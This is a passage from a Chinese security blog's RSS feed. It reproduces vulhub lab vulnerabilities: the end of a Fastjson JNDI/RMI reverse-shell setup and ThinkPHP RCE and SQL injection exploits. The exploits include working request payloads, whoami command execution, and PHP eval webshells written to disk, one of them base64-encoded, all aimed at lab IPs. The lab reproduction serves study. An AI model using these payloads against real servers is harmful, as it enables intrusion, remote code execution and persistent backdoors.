&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 7777&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 5555&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &amp;quot;http://192.168.100.131:5555/#GetShell&amp;quot; 9999&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202024134.png&#34; alt=&#34;image-20240425202024134&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202135914.png&#34; alt=&#34;image-20240425202135914&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202210491.png&#34; alt=&#34;image-20240425202210491&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后BP抓包，修改POST方法，修改Content-Type，修改payload发送&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 272&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;a&amp;quot;:&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;@type&amp;quot;:&amp;quot;java.lang.Class&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;val&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;b&amp;quot;:&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;dataSourceName&amp;quot;:&amp;quot;rmi://192.168.100.131:9999/GetShell&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;autoCommit&amp;quot;:true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202527880.png&#34; alt=&#34;image-20240425202527880&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202511365.png&#34; alt=&#34;image-20240425202511365&#34;&gt;&lt;/p&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Bossfrank/article/details/130100893&#34;&gt;https://blog.csdn.net/Bossfrank/article/details/130100893&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/letthink/p/16153248.html#/c/subject/p/16153248.html&#34;&gt;https://www.cnblogs.com/letthink/p/16153248.html#/c/subject/p/16153248.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/huayimy/article/details/130273362&#34;&gt;https://blog.csdn.net/huayimy/article/details/130273362&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/karsa/p/15983486.html&#34;&gt;https://www.cnblogs.com/karsa/p/15983486.html&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.gitee.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
            <title>【vulhub】ThinkPHP漏洞复现</title>
            <link>https://w-sqrt7.gitee.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
            <category>原创</category>
            <category>靶场</category>
            <category>vulhub</category>
            <pubDate>Thu, 25 Apr 2024 00:11:39 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;【vulhub】ThinkPHP漏洞复现&#34;&gt;&lt;a href=&#34;#【vulhub】ThinkPHP漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;【vulhub】ThinkPHP漏洞复现&#34;&gt;&lt;/a&gt;【vulhub】ThinkPHP漏洞复现&lt;/h1&gt;&lt;p&gt;​	PHP框架是许多代码的集合，这些代码是程序结构的代码(并不是业务代码)，代码中有许多函数、类、功能类包，框架的代码按照一定标准组成了一个有机的功能体，这个功能体中有许多设计模式如MVC、单例、AR等。&lt;br&gt;​	ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，是一个轻量级框架，内部OOP和面向过程代码都存在，是国人自己开发的框架。同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib、RoR的ORM映射和ActiveRecord模式。&lt;/p&gt;
&lt;h1 id=&#34;2-rce&#34;&gt;&lt;a href=&#34;#2-rce&#34; class=&#34;headerlink&#34; title=&#34;2-rce&#34;&gt;&lt;/a&gt;2-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：&#34;&gt;&lt;a href=&#34;#漏洞原理：&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP 2.x版本中，使用&lt;code&gt;preg_replace&lt;/code&gt;的&lt;code&gt;/e&lt;/code&gt;模式匹配路由：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;@(\w+)&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$depr&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;([^&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$depr&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;\/]+)@e&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;$var[\&amp;#x27;\\1\&amp;#x27;]=&amp;quot;\\2&amp;quot;;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;title function_ invoke__&#34;&gt;implode&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$depr&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$paths&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。&lt;/p&gt;
&lt;p&gt;ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。&lt;/p&gt;
&lt;p&gt;具体原理过程参考文章：&lt;a href=&#34;https://www.freebuf.com/sectool/223149.html%EF%BC%88%E5%BC%BA%E7%83%88%E6%8E%A8%E8%8D%90%E7%9C%8B%E5%AE%8C%EF%BC%81%EF%BC%89&#34;&gt;https://www.freebuf.com/sectool/223149.html（强烈推荐看完！）&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：&#34;&gt;&lt;a href=&#34;#漏洞复现：&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;根据对漏洞原理的理解，构造payload，获取phpinfo信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=a/b/c/$&amp;#123;phpinfo()&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170222558.png&#34; alt=&#34;image-20240424170222558&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造payload，配合蚁剑等工具进行连接，获取shell&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=a/b/c/$&amp;#123;@print(eval($_POST[sqrt7]))&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170623602.png&#34; alt=&#34;image-20240424170623602&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170654949.png&#34; alt=&#34;image-20240424170654949&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-0-23-rce&#34;&gt;&lt;a href=&#34;#5-0-23-rce&#34; class=&#34;headerlink&#34; title=&#34;5.0.23-rce&#34;&gt;&lt;/a&gt;5.0.23-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-1&#34;&gt;&lt;a href=&#34;#漏洞原理：-1&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。&lt;/p&gt;
&lt;p&gt;实现框架的核心类Requests的method方法实现表单请求类伪装，默认为$_POST[‘_method’]变量，却没有对_method属性进行严格校验，可以通过变量覆盖Requests类的属性，在结合框架特性实现对任意函数的调用实现任意代码执行&lt;/p&gt;
&lt;p&gt; 影响版本&lt;/p&gt;
&lt;p&gt;ThinkPHP 5.0.x&lt;del&gt;5.0.23&lt;br&gt;ThinkPHP 5.1.x&lt;/del&gt;5.1.31&lt;br&gt;ThinkPHP 5.2.0beta1&lt;/p&gt;
&lt;p&gt;具体原理参考文章：（需要一定的基础）&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/solitudi/article/details/113796433&#34;&gt;https://blog.csdn.net/solitudi/article/details/113796433&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：-1&#34;&gt;&lt;a href=&#34;#漏洞复现：-1&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;BP抓包修改数据，执行命令，获取信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?s=captcha&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-24%20191819.png&#34; alt=&#34;屏幕截图 2024-04-24 191819&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试创建后门，利用蚁剑进行连接&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?s=captcha&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=echo &amp;quot;&amp;lt;?php @eval(\$_POST[sqrt7])?&amp;gt;&amp;quot; &amp;gt;&amp;gt; sqrt.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=echo &amp;quot;PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pPz4=&amp;quot;|base64 -d &amp;gt;&amp;gt; sqrt.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424192934769.png&#34; alt=&#34;image-20240424192934769&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-rce&#34;&gt;&lt;a href=&#34;#5-rce&#34; class=&#34;headerlink&#34; title=&#34;5-rce&#34;&gt;&lt;/a&gt;5-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-2&#34;&gt;&lt;a href=&#34;#漏洞原理：-2&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。&lt;/p&gt;
&lt;p&gt;影响版本&lt;/p&gt;
&lt;p&gt;ThinkPHP5:&lt;br&gt;5.0.x&lt;del&gt;5.0.23；&lt;br&gt;5.1.0&lt;/del&gt;5.1.30；&lt;br&gt;不同版本payload不同， 5.1.13之后还与debug模式有关&lt;/p&gt;
&lt;p&gt;具体原理参考文章：（需要一定的基础）&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/289860.html&#34;&gt;https://www.freebuf.com/articles/web/289860.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：-2&#34;&gt;&lt;a href=&#34;#漏洞复现：-2&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;构造payload，执行命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=-1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230451281.png&#34; alt=&#34;image-20240424230451281&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230509901.png&#34; alt=&#34;image-20240424230509901&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试写入后门木马进行连接&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=file_put_contents&amp;amp;vars[1][]=shell.php&amp;amp;vars[1][1]=&amp;#x27;&amp;lt;?php phpinfo();eval($_REQUEST[7]);?&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload解释：调用file_put_contents方法将&amp;#x27;&amp;lt;?php phpinfo();eval($_REQUEST[7]);?&amp;gt;&amp;#x27;写入shell.php文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424231120979.png&#34; alt=&#34;image-20240424231120979&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;in-sqlinjection&#34;&gt;&lt;a href=&#34;#in-sqlinjection&#34; class=&#34;headerlink&#34; title=&#34;in-sqlinjection&#34;&gt;&lt;/a&gt;in-sqlinjection&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-3&#34;&gt;&lt;a href=&#34;#漏洞原理：-3&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP5 SQL注入漏洞 &amp;amp;&amp;amp; 敏感信息泄露&lt;/p&gt;
&lt;p&gt;传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。&lt;/p&gt;
&lt;p&gt;重点还是在于通过敏感信息泄露进一步的利用，sql注入漏洞起到的作用只体现在爆出敏感信息。&lt;/p&gt;
&lt;p&gt;影响版本&lt;br&gt;ThinkPHP &amp;lt; 5.1.23&lt;br&gt;该漏洞的形成最关键一点是需要开启debug模式&lt;/p&gt;
&lt;p&gt;具体原理参考文章：（需要一定的基础）&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&#34;&gt;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：-3&#34;&gt;&lt;a href=&#34;#漏洞复现：-3&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134/index.php?ids[]=1&amp;amp;ids[]=2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424234654144.png&#34; alt=&#34;image-20240424234654144&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424235410605.png&#34; alt=&#34;image-20240424235410605&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;lang-rce&#34;&gt;&lt;a href=&#34;#lang-rce&#34; class=&#34;headerlink&#34; title=&#34;lang-rce&#34;&gt;&lt;/a&gt;lang-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-4&#34;&gt;&lt;a href=&#34;#漏洞原理：-4&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP是一个在中国使用较多的PHP框架。在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用lang参数来包含任意PHP文件。&lt;/p&gt;
&lt;p&gt;虽然只能包含本地PHP文件，但在开启了register_argc_argv且安装了pcel&amp;#x2F;pear的环境下，可以包含&amp;#x2F;usr&amp;#x2F;local&amp;#x2F;lib&amp;#x2F;php&amp;#x2F;pearcmd.php并写入任意文件。&lt;/p&gt;
&lt;p&gt;影响版本：&lt;/p&gt;
&lt;p&gt;6.0.1 &amp;lt; ThinkPHP≤ 6.0.13&lt;/p&gt;
&lt;p&gt;5.0.0 &amp;lt; ThinkPHP≤ 5.0.12&lt;/p&gt;
&lt;p&gt;5.1.0 &amp;lt; ThinkPHP≤ 5.1.8&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、需要Thinkphp开启多语言功能&lt;/p&gt;
&lt;p&gt;2、安装pear扩展&lt;/p&gt;
&lt;p&gt;3、知道pearcmd.php路径&lt;/p&gt;
&lt;p&gt;4、register_argc_argv&amp;#x3D;on&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：-4&#34;&gt;&lt;a href=&#34;#漏洞复现：-4&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;进行漏洞验证&lt;/p&gt;
